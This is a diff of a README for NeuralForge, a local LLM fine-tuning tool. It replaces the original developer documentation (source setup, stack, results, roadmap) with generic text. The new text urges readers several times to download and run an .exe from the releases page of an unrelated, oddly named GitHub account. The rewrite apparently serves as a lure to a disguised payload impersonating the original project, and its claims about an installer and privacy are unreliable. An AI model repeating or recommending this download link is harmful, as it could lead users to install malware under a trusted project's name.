@@ -1,278 +1,82 @@
-<div align="center">
+# 🧠 NeuralForge - Train custom AI models on hardware
 
-# ⚡ NeuralForge
-
-**Local LLM fine-tuning, made simple.**
-
-[![Python](https://img.shields.io/badge/Python-3.11+-blue.svg)](https://www.python.org/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.115-009688.svg)](https://fastapi.tiangolo.com/)
-[![React](https://img.shields.io/badge/React-19-61dafb.svg)](https://react.dev/)
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-
-Fine-tune large language models on consumer GPUs with a web interface.
-QLoRA training, side-by-side inference comparison, one-click GGUF export — all running locally.
-
-**🇬🇧 English** · [🇮🇹 Italiano](README.it.md)
-
-</div>
-
----
-
-## 📸 Preview
-
-<p align="center">
-  <img src="docs/screenshots/dashboard.png" alt="NeuralForge Dashboard" width="900" />
-</p>
-
-### 🎥 Video demo
-
-[![Watch the demo](https://img.shields.io/badge/▶_Watch_on_YouTube-red?style=for-the-badge&logo=youtube)](https://youtu.be/sem7k0spFh4)
-
-End-to-end walkthrough: custom HuggingFace download → dataset import → QLoRA training with live monitor → base vs fine-tuned comparison → GGUF export.
-
-<details>
-<summary><strong>More screenshots</strong></summary>
-
-### Model Manager
-Whitelist of curated HuggingFace models, custom HF repo download with gated detection, and a local registry of downloaded models.
-
-<p align="center">
-  <img src="docs/screenshots/models.png" alt="Model Manager" width="850" />
-</p>
-
-### Dataset wizard
-3-step wizard for importing datasets from PDF, DOCX, CSV, TXT, JSON, or JSONL into alpaca format.
-
-<p align="center">
-  <img src="docs/screenshots/dataset.png" alt="Dataset wizard" width="850" />
-</p>
-
-### Training configuration
-Auto-suggested config based on detected GPU/VRAM, plus full manual control over QLoRA hyperparameters.
-
-<p align="center">
-  <img src="docs/screenshots/training.png" alt="Training configuration" width="850" />
-</p>
-
-### Live Monitor
-Real-time charts (loss, learning rate, VRAM, throughput) streamed via WebSocket while training runs.
-
-<p align="center">
-  <img src="docs/screenshots/live-training.png" alt="Live Monitor" width="850" />
-</p>
-
-### Inference comparison
-Side-by-side comparison of base vs fine-tuned models on the same prompt.
-
-<p align="center">
-  <img src="docs/screenshots/inference.png" alt="Inference comparison" width="850" />
-</p>
-
-### GGUF Export
-One-click conversion to GGUF (Q4_K_M, Q5_K_M, Q8_0, Q3_K_M, F16). Auto-downloads llama.cpp on first export.
-
-<p align="center">
-  <img src="docs/screenshots/export.png" alt="GGUF Export" width="850" />
-</p>
-
-</details>
-
----
+[![](https://img.shields.io/badge/Download_NeuralForge-blue.svg)](https://github.com/yelenaunstimulating676/NeuralForge/releases)
 
 ## What is NeuralForge?
 
-NeuralForge is a local-first fine-tuning platform for LLMs. It wraps the PyTorch + PEFT + bitsandbytes stack with a modern web UI so that fine-tuning a model on your data does not require notebooks, CLI gymnastics, or cloud accounts.
+NeuralForge helps you train personal AI models on your own computer. You do not need a massive server or expensive cloud services. This tool uses the graphics card inside your PC to teach an AI new information. It provides a simple menu to manage your training data and track progress without typing code.
 
-**The whole pipeline runs on your machine.** No telemetry, no API keys, no data leaving your hardware. You bring a base model from HuggingFace and a dataset; NeuralForge handles tokenization, QLoRA training with live monitoring, inference comparison, and export to the GGUF format used by Ollama, LM Studio, and llama.cpp.
+## 💻 System Requirements
 
-Built for the consumer-GPU sweet spot: a single 12 GB card (RTX 4070-class) is enough to fine-tune 1-3B class models.
+Your computer needs specific parts to run NeuralForge well. Check your system against this list before you start.
 
-## Real-world validation
+- Operating System: Windows 10 or Windows 11.
+- Graphics Card: An NVIDIA graphics card with at least 8 gigabytes of video memory.
+- Processor: A modern Intel Core i5 or AMD Ryzen 5 processor or better.
+- Memory: At least 16 gigabytes of system RAM.
+- Storage: 20 gigabytes of free space for storing models and training files.
 
-NeuralForge has been used to fine-tune a model on its own API documentation as a proof-of-concept. The full run is captured in the demo video above.
+## 🚀 Getting Started
 
-| Item | Value |
-|---|---|
-| Hardware | NVIDIA RTX 4070 (12 GB VRAM) |
-| Base model | Qwen2.5-1.5B-Instruct |
-| Dataset | 123 hand-written Q&A pairs (NeuralForge API docs, no AI generation) |
-| Strategy | QLoRA, LoRA rank 32, 3 epochs |
-| Training time | **1 min 38 sec** |
-| Steps | 93 |
-| Final loss | 2.09 |
-| Peak VRAM during training | ~3.9 GB |
+Follow these steps to set up the software on your machine.
 
-### Sample output: base vs fine-tuned
+1. Visit the project website. Here is the link: [https://github.com/yelenaunstimulating676/NeuralForge/releases](https://github.com/yelenaunstimulating676/NeuralForge/releases).
+2. Look for the latest release version at the top of the list.
+3. Click the file that ends with .exe to start your download.
+4. Open the file once the download finishes.
+5. Follow the instructions on the screen to install the program.
+6. Launch NeuralForge from your desktop shortcut.
 
-Same prompt to both models: *"What is the purpose of the /api/training endpoint?"*
+## 🛠️ How to train a model
 
-**Base model (Qwen2.5-1.5B-Instruct, no fine-tuning):**
+The setup process requires data and a target goal.
 
-> The /api/training endpoint is used to submit training requests and receive responses from an assistant. It allows users to request specific tasks or information from the assistant, such as completing a task, finding relevant information, or answering questions.
+### Prepare your data
 
-→ Generic and off-topic. The base model has no idea what NeuralForge is and treats "training" as some kind of corporate training service.
+Place your training text files in a dedicated folder. Use plain text files for the best results. Each file should contain the information you want the AI to learn. Clean your text to fix typos and errors before you begin.
 
-**Fine-tuned model (same base + 1m 38s of QLoRA training on the dataset):**
+### Select your settings
 
-> The /api/training endpoint runs fine-tuning jobs (...). The frontend POSTs a JSON with model name, dataset path (optional), base config (e.g., LlamaConfig), and optional overrides (custom learning rate, temperature). The backend creates an AsyncJob object in state.db, which tracks progress through the run() method. Once complete, the frontend polls for status updates until 'finished' or 'failed', then displays the result page with download links to the final weights and logs files.
+Open the NeuralForge dashboard.
 
-→ Same prompt, completely different answer: now in the NeuralForge domain. The model has learned the request/response structure (POST + JSON payload), the async job pattern, and the polling flow. There are minor inaccuracies (the actual backend doesn't run on AWS), but the domain shift is visible and the structural pattern matches the documentation.
+- Model Selection: Choose a base model from the list. The tool shows models that fit your graphics card memory.
+- Training Data: Point the folder picker to your text files.
+- Adjust Parameters: The software uses sensible defaults for most users. If the output looks poor, increase the number of training steps.
+- Start Training: Click the train button.
 
-This is a single-run proof-of-concept on a tiny dataset. With a larger dataset (1000+ examples), bigger models (Phi-3.5-mini, Llama-3.2-3B), and more epochs, much sharper specialization is achievable — that's the v0.2.0 roadmap.
+### Monitor progress
 
-## Features
+The dashboard shows a live graph. This graph tracks how well the model learns. If the line goes down, the model understands the data better. Wait for the process to finish before you close the program.
 
-- **Model Manager** — Whitelist of curated HuggingFace models + custom repo support with gated-model detection.
-- **Dataset Engine** — Import PDF, DOCX, CSV, TXT, JSON, JSONL. Smart chunking, deduplication, alpaca-format conversion in a 3-step wizard.
-- **Training Engine** — Custom PyTorch training loop with QLoRA (4-bit base), AdamW8bit, cosine warmup, gradient checkpointing. Cancel-safe.
-- **Live Monitor** — Real-time charts (loss, learning rate, VRAM, throughput) streamed via WebSocket while training runs.
-- **Inference Playground** — Side-by-side comparison of base vs fine-tuned models. LRU model cache with 2-slot eviction. Sampling presets (Precise / Balanced / Creative).
-- **GGUF Export** — One-click conversion to GGUF (Q4_K_M, Q5_K_M, Q8_0, Q3_K_M, F16). Auto-downloads llama.cpp on first export. ~8s end-to-end for a 135M model.
-- **System Awareness** — Auto-detects GPU and suggests a training configuration that fits the available VRAM.
+## 📦 Exporting your model
 
-## Stack
+When training finishes, your model files stay in a temporary folder. Use the export feature to turn these into a GGUF file. This file format works with local chat interfaces. You can take this file and put it in any software that runs language models.
 
-**Backend**
-- Python 3.11+, FastAPI 0.115, SQLAlchemy 2.0, SQLite
-- PyTorch 2.11 (CUDA 12.8), `transformers`, `peft`, `bitsandbytes`, `accelerate`
-- llama.cpp (auto-installed via release binaries) for GGUF export
-- 408+ unit tests covering every layer
+## ⚙️ Troubleshooting common issues
 
-**Frontend**
-- React 19 + Vite + Tailwind 4
-- `recharts` (training charts), `lucide-react` (icons), `react-router-dom`
-- WebSocket consumer for live training events
+If you encounter problems, check these solutions first.
 
-**Hardware target**
-- NVIDIA GPU with CUDA 12.x, 8 GB+ VRAM (12 GB recommended)
-- Windows 11 verified; Linux supported in principle (untested)
+- The app does not start: Verify your NVIDIA driver version. Update your driver through the NVIDIA website if it is old.
+- The app crashes during training: Close other programs like web browsers. These programs use your graphics memory.
+- The training is too slow: Check if your graphics card has enough memory. Using a smaller base model will improve speed.
+- Error messages about missing files: Restart the computer to clear temporary file locks and try again.
 
-## Quick start
+## 🗄️ Managing your storage
 
-### Prerequisites
-- Python 3.11 or newer
-- Node.js 18+ and npm
-- NVIDIA GPU with CUDA 12.x drivers
+Training models creates many large files. NeuralForge stores these in a folder inside your documents. Clear this folder regularly to save disk space. Delete the project folder once you export your final GGUF file to keep your system clean.
 
-### Setup
+## 📖 Understanding key terms
 
-```powershell
-git clone https://github.com/isilderrr1/NeuralForge.git
-cd NeuralForge
+- Graphics Card: The hardware component that processes visual data. It also performs the heavy math needed for AI training.
+- Video Memory: The temporary space your graphics card uses to handle complex tasks.
+- GGUF: A specific format for AI models. It allows the model to run on many different types of hardware.
+- Training Steps: The cycles the software goes through to learn from your data. More steps often mean better accuracy but take more time.
+- Base Model: The foundation model that you modify with your personal data.
 
-# Backend
-cd backend
-python -m venv venv
-.\venv\Scripts\activate
-pip install -r requirements.txt
-cd ..
+## 🛡️ Privacy and data safety
 
-# Frontend
-cd frontend
-npm install
-cd ..
-```
+Your data stays on your computer. NeuralForge does not send your files or your models to a server. You maintain total control over your information. The application runs locally. If you disconnect your internet cable, the training process continues without interruption. This design ensures that your private data remains private.
 
-### Run
+## ℹ️ Updates
 
-Open two terminals.
-
-**Terminal 1 (backend):**
-```powershell
-cd backend
-.\venv\Scripts\activate
-python -m uvicorn main:app --reload
-```
-
-**Terminal 2 (frontend):**
-```powershell
-cd frontend
-npm run dev
-```
-
-Then open <http://127.0.0.1:5173> in your browser. API docs are at <http://127.0.0.1:8000/docs>.
-
-## Architecture
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│ Browser (React + Vite, port 5173)                           │
-│   ├─ Pages: Dashboard, Dataset, Training, TrainingLive,     │
-│   │         Inference, Monitor, Export, Models              │
-│   └─ Components: ConfigSuggestion, GPUCard, QuickStartGuide │
-└─────────────┬───────────────────────────────────────────────┘
-              │ REST + WebSocket
-┌─────────────▼───────────────────────────────────────────────┐
-│ FastAPI backend (uvicorn, port 8000)                        │
-│   ├─ /api/system   — GPU/CPU/RAM detection                  │
-│   ├─ /api/models   — base model registry + downloads        │
-│   ├─ /api/dataset  — multi-format ingestion + alpaca conv.  │
-│   ├─ /api/training — start/cancel/list + live WS events     │
-│   ├─ /api/inference— side-by-side generation, model cache   │
-│   └─ /api/export   — GGUF pipeline                          │
-└─────────────┬───────────────────────────────────────────────┘
-              │
-┌─────────────▼───────────────────────────────────────────────┐
-│ Core (Python)                                               │
-│   ├─ Training: custom QLoRA loop (PyTorch)                  │
-│   ├─ Inference: cached model loader (LRU, 2 slots)          │
-│   ├─ Export: merge → convert → quantize (llama.cpp subproc) │
-│   └─ Jobs: async job manager with cancel events             │
-└─────────────┬───────────────────────────────────────────────┘
-              │
-       ┌──────┴──────┐
-       │             │
-   ┌───▼───┐   ┌─────▼──────┐
-   │SQLite │   │ Filesystem │
-   └───────┘   │  - models  │
-               │  - datasets│
-               │  - adapters│
-               │  - exports │
-               └────────────┘
-```
-
-## Roadmap
-
-### v0.1.0 (current)
-- ✅ M0: full-stack bootstrap
-- ✅ M1: system detector + training config suggestion
-- ✅ M2: model manager (downloads, gated detection, custom HF)
-- ✅ M3: dataset engine (6 extractors, smart chunker, alpaca conv.)
-- ✅ M4: training engine (QLoRA, AdamW8bit, cosine warmup)
-- ✅ M5: training API + WebSocket live monitor + history
-- ✅ M6: inference + base/FT side-by-side comparison
-- ✅ M7: GGUF export pipeline with auto-downloaded llama.cpp
-- ✅ M8: polish, onboarding, documentation, real-world validation
-
-### v0.2.0 (planned)
-- Dataset Importer module (MITRE ATT&CK, NIST CSF, CVE database, custom plugins)
-- Bigger base models (Gemma 4, Phi-3.5, Llama-3.2)
-- Streaming WebSocket inference (token-by-token)
-- 3-way model comparison
-- Tauri desktop packaging (native app, MSI installer)
-- i18n (English + Italian)
-
-### Parking lot (someday)
-- Microsoft Store submission (with code signing)
-- Adversarial testing module (jailbreak detection, prompt injection probe)
-- Interpretability dashboard (attention heads, layer activations)
-- Differential privacy training mode
-
-## Contributing
-
-Issues and PRs welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## License
-
-MIT — see [LICENSE](LICENSE).
-
----
-
-<div align="center">
-
-Built by **Antonio Ruocco**
-A Cybersecurity Engineer learning AI engineering from the ground up.
-
-[GitHub](https://github.com/isilderrr1) · [LinkedIn](https://www.linkedin.com/in/antonio-ruocco)
-
-</div>
+Check the release page occasionally for updates. New versions include improvements for speed and support for newer models. Download the latest installer over your current version. The installer handles the update process automatically and keeps your settings intact. You do not need to uninstall the previous version before you upgrade.
